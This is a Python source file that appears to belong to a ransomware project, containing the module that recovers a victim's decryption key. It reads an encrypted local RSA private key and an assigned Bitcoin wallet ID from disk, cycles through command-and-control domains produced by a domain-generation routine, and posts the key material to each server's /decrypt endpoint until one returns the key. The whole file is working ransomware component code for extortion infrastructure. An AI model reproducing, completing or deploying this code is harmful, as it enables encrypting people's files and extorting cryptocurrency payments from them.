import logging
import requests
from core.utils.file_ops import read_data_from_file
from core.utils.generators import generate_client_id
from base64 import b64encode, b64decode
from core.comms.cnc_generator import generate_domains
from core.config import (
    ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
    ENCRYPTED_BITCOIN_KEY_LOCATION,
    BITCOIN_WALLET_ID_PATH,
)

logger = logging.getLogger(__name__)


def build_request():
    """Build the decrypt request body

    Returns:
        dict: The parameters required for decrypt request
    """    
    logger.info("Building decrypt request")
    encrypted_local_rsa_key_parts = read_data_from_file(
        ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, serialized=False
    )

    body = {
        "client_id": generate_client_id(),
        "private_key": [
            b64encode(part).decode("ascii") for part in encrypted_local_rsa_key_parts
        ],
        "assigned_wallet_address": b64encode(
            read_data_from_file(BITCOIN_WALLET_ID_PATH.encode("utf-8"))
        ).decode("ascii"),
        "payee_wallet_address": "",
    }

    return body


def send_request(server, body):
    """Send the request to the server and return the response 

    Args:
        server (str): The domain name of the server
        body (dict): The request parameters

    Returns:
        dict: The response parameters
    """
    logger.info(f"Sending request to {server}")
    try:
        response = requests.post(url=f"http://{server}/decrypt", json=body)
        if response.status_code // 100 == 2:
            return response.json()
        else:
            logger.error(f"Some problem in server. Received {response.status_code}")
    except Exception as err:
        logger.error(err)


def get_decrypted_key_from_server():
    """Driver function to decrypt files by getting local RSA key from the server

    Returns:
        bytes: The decrypted local RSA key
    """   
    body = build_request()
    domains = generate_domains()
    for domain in domains:
        response = send_request(server=domain, body=body)
        if response:
            key = response.get("key","")
            return b64decode(key)

    raise Exception()

